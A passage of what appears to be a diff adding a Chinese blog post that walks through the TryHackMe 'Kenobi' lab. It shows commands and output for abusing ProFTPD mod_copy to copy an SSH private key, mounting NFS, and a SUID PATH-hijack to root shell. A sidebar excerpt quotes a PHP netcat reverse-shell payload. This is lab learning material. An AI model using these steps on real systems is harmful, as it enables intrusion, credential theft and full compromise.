 6877096.0  22%   16.0T        32000</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 3.91 seconds</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h2 id="ProFtpd"><a href="#ProFtpd" class="headerlink" title="ProFtpd"></a>ProFtpd</h2><blockquote>
+<p>ProFtpd 是一个免费的开源 FTP 服务器，与 Unix 和 Windows 系统兼容。它在过去的软件版本中也容易受到攻击。</p>
+</blockquote>
+<p>Searchsploit 基本上只是一个用于 exploit-db.com 的命令行搜索工具。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit proftpd 1.3.5</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/image-20250407223838-ykty6xa.png" alt="image"></p>
+<p>您应该已经从 ProFtpd 的 <a target="_blank" rel="noopener" href="http://www.proftpd.org/docs/contrib/mod_copy.html">mod_copy 模块</a>中找到了一个漏洞利用。</p>
+<p>mod_copy 模块实现 <strong>SITE CPFR</strong> 和 <strong>SITE CPTO</strong> 命令，这些命令可用于将文件&#x2F;目录从服务器上的一个位置复制到另一个位置。任何未经身份验证的客户端都可以利用这些命令将文件从文件系统的任何部分复制到选定的目标。</p>
+<p>我们知道 FTP 服务以 Kenobi 用户身份运行（从共享上的文件），并且会为该用户生成 ssh 密钥。</p>
+<p>现在，我们将使用 SITE CPFR 和 SITE CPTO 命令复制 Kenobi 的私钥。</p>
+<p>‍</p>
+<p>首先，我们先连上ftp服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nc machine-ip 21</span><br></pre></td></tr></table></figure>
+
+<p>然后：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">└─# proxychains4 nc 10.10.166.21 21</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">[proxychains] Dynamic chain  ...  156.246.88.98:9052  ...  10.10.166.21:21  ...  OK</span><br><span class="line">220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.166.21]</span><br><span class="line"></span><br><span class="line">site cpfr /home/kenobi/.ssh/id_rsa</span><br><span class="line">350 File or directory exists, ready <span class="keyword">for</span> destination name</span><br><span class="line">SITE CPFR /home/kenobi/.ssh/id_rsa</span><br><span class="line">350 File or directory exists, ready <span class="keyword">for</span> destination name</span><br><span class="line">SITE CPTO /var/tmp/id_rsa</span><br><span class="line">250 Copy successfu</span><br></pre></td></tr></table></figure>
+
+<p>我们知道 &#x2F;var 目录是我们可以看到的挂载目录。所以放到那里。</p>
+<p>现在让我们将 &#x2F;var&#x2F;tmp 目录挂载到我们的机器上。</p>
+<p>根据 <code>nmap</code>​ 扫描结果，<strong>目标</strong> <strong>​<code>10.10.166.21</code>​</strong>​ <strong>是开了 NFS 服务（2049端口）</strong>  的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 确保你本地系统装好了 NFS 客户端工具，如果没有：</span></span><br><span class="line">apt install nfs-common -y</span><br><span class="line"><span class="comment"># 指定类型为nfs</span></span><br><span class="line"> mount -t nfs 10.10.166.21:/ /root/test/407/mnt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/image-20250407225331-i9s4v2k.png" alt="image"></p>
+<p>获取私钥，在&#x2F;var&#x2F;tmp&#x2F;id_rsa</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> ./id_rsa /root/test/407</span><br><span class="line"><span class="built_in">chmod</span> 600 id_rsa</span><br><span class="line"></span><br><span class="line">ssh -i id_rsa kenobi@10.10.166.21</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/image-20250407225841-itdn11m.png" alt="image"></p>
+<p>‍</p>
+<p>挂载，获取私钥，获取基本权限</p>
+<p>‍</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>suid提权  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">/sbin/mount.nfs</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/snapd/snap-confine</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/newgidmap</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newuidmap</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/menu</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/fusermount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/su</span><br><span class="line">/bin/ping6</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>发现<code>/usr/bin/menu</code>，运行，发现真是个菜单</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">kenobi@kenobi:/tmp$ /usr/bin/menu</span><br><span class="line"></span><br><span class="line">***************************************</span><br><span class="line">1. status check</span><br><span class="line">2. kernel version</span><br><span class="line">3. ifconfig</span><br><span class="line">** Enter your choice :1</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Tue, 08 Apr 2025 08:19:27 GMT</span><br><span class="line">Server: Apache/2.4.18 (Ubuntu)</span><br><span class="line">Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT</span><br><span class="line">ETag: <span class="string">&quot;c8-591b6884b6ed2&quot;</span></span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">Content-Length: 200</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Content-Type: text/html</span><br><span class="line"></span><br><span class="line">kenobi@kenobi:/tmp$ /usr/bin/menu</span><br><span class="line"></span><br><span class="line">***************************************</span><br><span class="line">1. status check</span><br><span class="line">2. kernel version</span><br><span class="line">3. ifconfig</span><br><span class="line">** Enter your choice :3</span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 02:af:a0:56:16:09  </span><br><span class="line">          inet addr:10.10.208.177  Bcast:10.10.255.255  Mask:255.255.0.0</span><br><span class="line">          inet6 addr: fe80::af:a0ff:fe56:1609/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1</span><br><span class="line">          RX packets:69311 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:69192 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:3106339 (3.1 MB)  TX bytes:4598537 (4.5 MB)</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:65536  Metric:1</span><br><span class="line">          RX packets:178 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:178 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1 </span><br><span class="line">          RX bytes:13381 (13.3 KB)  TX bytes:13381 (13.3 KB)</span><br><span class="line"></span><br><span class="line">kenobi@kenobi:/tmp$ /usr/bin/menu</span><br><span class="line"></span><br><span class="line">***************************************</span><br><span class="line">1. status check</span><br><span class="line">2. kernel version</span><br><span class="line">3. ifconfig</span><br><span class="line">** Enter your choice :2</span><br><span class="line">4.8.0-58-generic</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p>Strings 是 Linux 上的一个命令，用于在二进制文件上查找人类可读的字符串。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">kenobi@kenobi:/tmp$ strings /usr/bin/menu</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">***************************************</span><br><span class="line">1. status check</span><br><span class="line">2. kernel version</span><br><span class="line">3. ifconfig</span><br><span class="line">** Enter your choice :</span><br><span class="line">curl -I localhost</span><br><span class="line"><span class="built_in">uname</span> -r</span><br><span class="line">ifconfig</span><br><span class="line"> Invalid choice</span><br><span class="line">;*3$<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">......</span></span><br></pre></td></tr></table></figure>
+
+<p>发现<code>curl -I localhost</code></p>
+<p>由于该文件以root权限运行，因此我们可以通过该文件获取root 权限。</p>
+<p>在类Unix系统中，curl命令是一种广泛使用的HTTP请求工具，如果你用shell脚本或其他内容覆盖实际的二进制文件，可能会破坏它的功能。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> /bin/sh &gt; curl </span><br><span class="line"><span class="built_in">chmod</span> 777 curl</span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br><span class="line"><span class="comment"># 在开头添加目录来临时修改环境变量。这意味着，当您运行命令时，shell 将首先在目录中查找可执行文件，然后再搜索原始 </span></span><br></pre></td></tr></table></figure>
+
+<p>此时，触发<code>/usr/bin/menu</code>​选择1，触发<code>curl</code>​，就会触发我们设置的<code>curl</code>​。得到一个root权限的<code>/bin/sh</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/image-20250408163843-vdr3d6t.png" alt="image"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/image-20250408163855-j85cd93.png" alt="image"></p>
+<p>‍</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://symya.github.io">symv1a</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://symya.github.io/post/kenobi-z1xnvhq.html">https://symya.github.io/post/kenobi-z1xnvhq.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F/">渗透</a><a class="post-meta__tags" href="/tags/%E6%89%93%E9%9D%B6/">打靶</a><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a><a class="post-meta__tags" href="/tags/TryHackMe/">TryHackMe</a></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/post/python-deserialization-vulnerability-analysis-zueyob.html" title="Python反序列化漏洞分析"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">Python反序列化漏洞分析</div></div><div class="info-2"><div class="info-item-1">Python反序列化漏洞分析前置知识 Python 对象序列化Python中序列化一般有三种方式: pickle模块和json模块, 还有一个更原始的序列化模块marshal。pickle模块是Python特有的格式, json模块是json通用的格式。marshal存在主要是为了支持 Python 的 .pyc 文件。一般地 pickle 应该是序列化 Python 对象时的首选。 官方文档的解释：pickle — Python 对象序列化 — Python 3.12.5 文档 python中可以被序列化和反序列化的对象下列类型可以被封存：  内置常量 (None, True, False, Ellipsis 和 NotImplemented)； 整数、浮点数、复数; 字符串、字节串、字节数组; 只包含可封存对象的元组、列表、集合和字典; 可在模块最高层级上访问的（内置与用户自定义的）函数（使用 def，而不是使用 lambda 定义）; 可在模块最高层级上访问的类; 这种类的实例调用 \_\_getstate\_\_() 的结果是可 pickle...</div></div></div></a><a class="pagination-related" href="/post/skynet-z1e39th.html" title="THM - Offensive Pentesting - Section2 - Skynet"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">THM - Offensive Pentesting - Section2 - Skynet</div></div><div class="info-2"><div class="info-item-1">THM - Offensive Pentesting - Section2 - Skynet‍ 外网打点nmap扫描报告12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849nmap -sV -sC -p- --min-rate 10000 10.10.220.42Starting Nmap 7.80 ( https://nmap.org ) at 2025-04-14 03:50 EDTWarning: 10.10.220.42 giving up on port because retransmission cap hit (10).Nmap scan report for 10.10.220.42Host is up (0.23s latency).Not shown: 51285 closed ports, 14244 filtered portsPORT    STATE SERVICE     VERSION22/tcp  open  ssh ...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/post/overpass-2-hacked-1pfl8c.html" title="THM - Offensive Pentesting - Section2 - Overpass 2 - Hacked"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-18</div><div class="info-item-2">THM - Offensive Pentesting - Section2 - Overpass 2 - Hacked</div></div><div class="info-2"><div class="info-item-1">THM - Offensive Pentesting - Section2 - Overpass 2 - Hacked Overpass 被黑了！SOC团队（Paradox，恭喜升级）在深夜值班时查看 shibes 时发现了可疑活动，并成功捕获了攻击发生时的数据包。 您能弄清楚攻击者是如何入侵的，并重新入侵 Overpass 的生产服务器吗？  他们用来上传反向 shell 的页面 URL 是什么？流量包中可以看到是development  ‍ payload 1&lt;?php exec(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.170.145 4242 &gt;/tmp/f&quot;)?&gt;  密码在tcp流3中  发现使用了ssh-backdoor  1git clone...</div></div></div></a><a class="pagination-related" href="/post/skynet-z1e39th.html" title="THM - Offensive Pentesting - Section2 - Skynet"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-14</div><div class="info-item-2">THM - Offensive Pentesting - Section2 - Skynet</div></div><div class="info-2"><div class="info-item-1">THM - Offensive Pentesting - Section2 - Skynet‍ 外网打点nmap扫描报告12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849nmap -sV -sC -p- --min-rate 10000 10.10.220.42Starting Nmap 7.80 ( https://nmap.org ) at 2025-04-14 03:50 EDTWarning: 10.10.220.42 giving up on port because retransmission cap hit (10).Nmap scan report for 10.10.220.42Host is up (0.23s latency).Not shown: 51285 closed ports, 14244 filtered portsPORT    STATE SERVICE     VERSION22/tcp  open  ssh ...</div></div></div></a><a class="pagination-related" href="/post/thm-offensive-pentesting-section2-relevant-z18fgvu.html" title="THM - Offensive Pentesting - Section2 - Relevant"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-01</div><div class="info-item-2">THM - Offensive Pentesting - Section2 - Relevant</div></div><div class="info-2"><div class="info-item-1">THM - Offensive Pentesting - Section2 - Relevant 您已被指派给一位客户，该客户希望对七天内将要发布到生产环境中进行渗透测试。 工作范围 客户要求工程师对提供的虚拟环境进行评估。客户要求提供关于评估的最低限度的信息，希望从恶意行为者的角度进行评估（黑盒渗透测试）。客户要求您获取两个 flag（未提供位置）作为漏洞利用的证据：  用户.txt 根.txt  此外，客户还提供了以下范围许可：  本次活动允许使用任何工具或技术，但我们要求您首先尝试手动利用 找到并记录发现的所有漏洞 将发现的标志提交到仪表板 只有分配给您的机器的 IP 地址在范围内 查找并报告所有漏洞（是的，根路径不止一条）  （角色扮演关闭） 我鼓励你把这次挑战当成一次真正的渗透测试来对待。你可以考虑写一份报告，其中包含执行摘要、漏洞和利用评估以及补救建议，这将有助于你准备 eLearnSecurity 认证专业渗透测试员，或成为一名渗透测试员。注意 - 此房间内的任何内容都不需要Metasploit 机器可能需要最多 5...</div></div></div></a><a class="pagination-related" href="/post/the-intranet-shooting-range-reappears-in-the-2022-netding-cup-finals-1fl3li.html" title="2022网鼎杯决赛内网靶场复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-10</div><div class="info-item-2">2022网鼎杯决赛内网靶场复现</div></div><div class="info-2"><div class="info-item-1">2022网鼎杯决赛内网靶场复现工具 目录扫描工具[[dirsreach]]，[[gobuster]] , antsword，godzilla，[[fscan]]，[[WPScan]]，[[chisel]]，[[frp]]，[[Proxifier]] , [[msf]]，[[WMIexec]]，rdp是什么，[[CrackMapExec]] 复现 靶标介绍：该靶场为 2022 第三届网鼎杯决赛内网靶场复盘。完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有 4 个 flag，分布于不同的靶机。 考点：  wordpress插件rce MS17-010 AS-REP Roasting 基于资源的约束性委派 智能卡身份验证出错下的CVE-2022–26923 AD域提权打法——Schannel传递证书传递到LDAPS，修改LDAP配置RBCD  渗透的过程  外网打点  -&gt;...</div></div></div></a><a class="pagination-related" href="/post/the-shooting-range-that-i-accidentally-discovered-during-a-mysterious-group-chat-bwhwi.html" title="水群看见的靶场，打一打"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-02</div><div class="info-item-2">水群看见的靶场，打一打</div></div><div class="info-2"><div class="info-item-1">水群看见的靶场，打一打 地址：http://111.119.241.115:10088/ 开放一个靶机，靶机每30分钟重置一次  你需要完成信息收集，拿到初次的一些信息来完成后续的漏洞攻击 你需要找到第二个漏洞来获取第三个高危漏洞 恭喜你获取到了第三个漏洞点，不过值得烧脑的是这个获取shell不是很容易 历经千辛万苦，你获取到了shell，但是需要查看根目录下的flag还是有难度的，你需要根据常用的提权方式和主机的信息泄露获取到后面的一些权限 恭喜你获取到了权限，但还不是root，仔细看看怎么样获取到flag文件？  环境为仿真自建，不针对其他cms，漏洞思路来源于当前现实生活，思路比较新，有一些ctf烧脑，难度适中#渗透测试 #CTF #提权  ‍ 直接给的ip+端口号，可以忽略扫端口那一整块。直接扫目录 ​​ ​​ 扫到了一个database.sql​文件，down下来，审计发现： 123456789101112131415161718192021222324252627DROP TABLE IF EXISTS `admins`;/*!40101 SET...</div></div></div></a><a class="pagination-related" href="/post/ccb-z184yjw.html" title="ccb&amp;ciscn线下半决赛 - wp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-18</div><div class="info-item-2">ccb&amp;ciscn线下半决赛 - wp</div></div><div class="info-2"><div class="info-item-1">ccb&amp;ciscn线下半决赛 - wp 有幸拿到一等奖  awdpphp-master 导入 12345# docker 导入docker load -i xxx.tar# 不知道端口的情况下运行该镜像docker run -it &lt;images&gt; /bin/bash  查看运行端口，发现就是80，那就可以用以下命令运行docker 123docker run -d -p 4545:80 &lt;images&gt; # 进入容器docker exec -it &lt;container&gt; /bin/bash  ‍ 在容器中找到index.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687&lt;?php@error_reporting(E_ALL);if...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comments</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://cdn.jsdelivr.net/gh/symya/MyPic/2025/test.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">symv1a</div><div class="author-info-description">随便写写，随缘更新</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/symya"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/symya" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:symv1a@163.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">今日事，今日毕</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#THM-Offensive-Pentesting-Section-Kenobi"><span class="toc-number">1.</span> <span class="toc-text">THM - Offensive Pentesting - Section - Kenobi</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#samba"><span class="toc-number">1.1.</span> <span class="toc-text">samba</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rpcbind"><span class="toc-number">1.2.</span> <span class="toc-text">rpcbind</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ProFtpd"><span class="toc-number">1.3.</span> <span class="toc-text">ProFtpd</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.4.</span> <span class="toc-text">提权</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/cve202551482-letta-ai-component-code-injection-leads-to-rce-zxwmhs.html" title="CVE-2025-51482 Letta AI 组件代码注入导致RCE">CVE-2025-51482 Letta AI 组件代码注入导致RCE</a><time datetime="2026-01-07T10:40:09.000Z" title="Created 2026-01-07 10:40:09">2026-01-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/cve20253248-z2i1g0l.html" title="CVE-2025-3248">CVE-2025-3248</a><time datetime="2026-01-05T09:56:35.000Z" title="Created 2026-01-05 09:56:35">2026-01-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/basic-use-of-suricata-23gslt.html" title="suricata基本使用">suricata基本使用</a><time datetime="2025-12-26T16:37:21.000Z" title="Created 2025-12-26 16:37:21">2025-12-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/mac-ida-pro9.2-mcp-traepei-zhi-jiao-cheng-1r5x1m.html" title="MAC+IDA Pro9.2+MCP+Trae配置教程">MAC+IDA Pro9.2+MCP+Trae配置教程</a><time datetime="2025-12-24T09:44:55.000Z" title="Created 2025-12-24 09:44:55">2025-12-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/2025rctf-wp-1ljcfy.html" title="2025RCTF wp">2025RCTF wp</a><time datetime="2025-11-20T15:51:03.000Z" title="Created 2025-11-20 15:51:03">2025-11-20</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://cdn.jsdelivr.net/gh/symya/MyPic/2025/wallhaven-z8egpo.png);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 - 2026 By symv1a</span></div><div class="footer_custom_text">Hi, welcome to my <a href="https://symya.github.io/">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="Toggle Between Traditional and Simplified Chinese">繁</button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll to Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>(() => {
+  const runMermaid = ele => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    ele.forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = `%%{init:{ 'theme':'${theme}'}}%%\n`
+      const mermaidID = `mermaid-${index}`
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+      const renderMermaid = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      // mermaid v9 and v10 compatibility
+      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+
+    codeMermaidEle.forEach(ele => {
+      const preEle = document.createElement('pre')
+      preEle.className = 'mermaid-src'
+      preEle.hidden = true
+      preEle.textContent = ele.textContent
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.appendChild(preEle)
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (true) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
